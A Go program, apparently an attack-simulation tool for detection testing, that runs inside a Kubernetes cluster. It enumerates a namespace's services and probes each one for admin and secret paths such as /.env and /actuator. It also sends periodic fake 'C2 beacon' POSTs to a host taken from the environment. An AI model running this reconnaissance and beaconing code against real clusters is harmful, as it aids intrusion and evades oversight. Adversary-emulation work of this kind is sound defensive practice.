package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"

	"sync"
	"time"

	"github.com/go-co-op/gocron/v2"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

// Store represents our in-memory K/V store
type Store struct {
	sync.RWMutex
	data map[string]interface{}
}

// NewStore creates a new Store instance
func NewStore() *Store {
	return &Store{
		data: make(map[string]interface{}),
	}
}

var store = NewStore()

// Common admin endpoints to probe
var adminEndpoints = []string{
	"/admin",
	"/administrator",
	"/wp-admin",
	"/dashboard",
	"/management",
	"/console",
	"/actuator",
	"/metrics",
	"/api",
	"/api/v1",
	"/api/v2",
	"/swagger",
	"/swagger-ui",
	"/swagger-ui.html",
	"/graphql",
	"/graphiql",
	"/debug",
	"/status",
	"/health",
	"/info",
	"/env",
	"/config",
	"/prometheus",
	"/monitoring",
	"/jenkins",
	"/phpmyadmin",
	"/adminer",
	"/server-status",
	"/.env",
	"/login",
}

func probeService(url string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	for _, endpoint := range adminEndpoints {
		fullURL := fmt.Sprintf("http://%s%s", url, endpoint)
		resp, err := client.Get(fullURL)
		if err != nil {
			log.Printf("evil request failed to %s: %v", fullURL, err)
			continue
		}
		defer resp.Body.Close()
		log.Printf("evil request succeeded to %s", fullURL)

		// Store interesting responses (non 404s)
		if resp.StatusCode != 404 {
			key := fmt.Sprintf("probe_%s%s", url, endpoint)
			store.Lock()
			store.data[key] = resp.StatusCode
			store.Unlock()
			log.Printf("Interesting endpoint found: %s (Status: %d)", fullURL, resp.StatusCode)
		}
	}
}

func checkK8sServices(clientset *kubernetes.Clientset, targetNS string) {
	services, err := clientset.CoreV1().Services(targetNS).List(context.Background(), metav1.ListOptions{})
	if err != nil {
		log.Printf("Error listing services: %v", err)
		return
	}

	fmt.Printf("\nServices in namespace %s:\n", targetNS)
	for _, svc := range services.Items {
		fmt.Printf("- %s\n", svc.Name)
		fmt.Printf("  Type: %s\n", svc.Spec.Type)
		fmt.Printf("  ClusterIP: %s\n", svc.Spec.ClusterIP)
		if len(svc.Spec.Ports) > 0 {
			fmt.Printf("  Ports:\n")
			for _, port := range svc.Spec.Ports {
				fmt.Printf("    - %d/%s\n", port.Port, port.Protocol)

				if (port.Port == 80 || port.Port == 443 || port.Port == 8080) && port.Protocol == "TCP" {
					serviceURL := fmt.Sprintf("%s:%d", svc.Spec.ClusterIP, port.Port)
					go probeService(serviceURL)
				}
			}
		}
	}
}

func sendC2Beacon(endpoint string) {
	// Create fake C2 payload
	payload := map[string]interface{}{
		"hostname":  fmt.Sprintf("compromised-pod-%d", time.Now().Unix()%100),
		"ip":        fmt.Sprintf("10.%d.%d.%d", time.Now().Unix()%255, time.Now().Unix()%255, time.Now().Unix()%255),
		"timestamp": time.Now().Unix(),
		"data":      "no_data",
	}

	// Convert to JSON
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Printf("Failed to marshal JSON payload: %v", err)
		return
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Send POST request
	_, err = client.Post(endpoint, "application/json", bytes.NewReader(jsonPayload))
	if err != nil {
		log.Printf("evil request failed to C2 endpoint %s: %v", endpoint, err)
		return
	}
	log.Printf("evil request succeeded to C2 endpoint %s", endpoint)
}

func main() {
	c2Endpoint := os.Getenv("C2_ENDPOINT")
	c2Interval := os.Getenv("C2_INTERVAL")
	targetNS := os.Getenv("TARGET_NS")
	if targetNS == "" {
		log.Fatal("TARGET_NS environment variable must be set")
	}

	config, err := rest.InClusterConfig()
	if err != nil {
		log.Fatalf("Failed to create in-cluster config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatalf("Failed to create clientset: %v", err)
	}

	s, err := gocron.NewScheduler()
	if err != nil {
		log.Fatalf("Failed to create scheduler: %v", err)
	}

	// Add k8s service check job to run every 10 seconds
	_, err = s.NewJob(
		gocron.DurationJob(10*time.Second),
		gocron.NewTask(
			func() {
				checkK8sServices(clientset, targetNS)
			},
		),
	)
	if err != nil {
		log.Fatalf("Failed to create job: %v", err)
	}

	// Add C2 beacon job if endpoint is configured
	if c2Endpoint != "" {
		interval := 60 * time.Second // Default 60s
		if c2Interval != "" {
			if d, err := time.ParseDuration(c2Interval); err == nil {
				interval = d
			}
		}

		_, err = s.NewJob(
			gocron.DurationJob(interval),
			gocron.NewTask(
				func() {
					sendC2Beacon(c2Endpoint)
				},
			),
		)
		if err != nil {
			log.Printf("Failed to create C2 beacon job: %v", err)
		}
	}

	s.Start()
	select {}
}
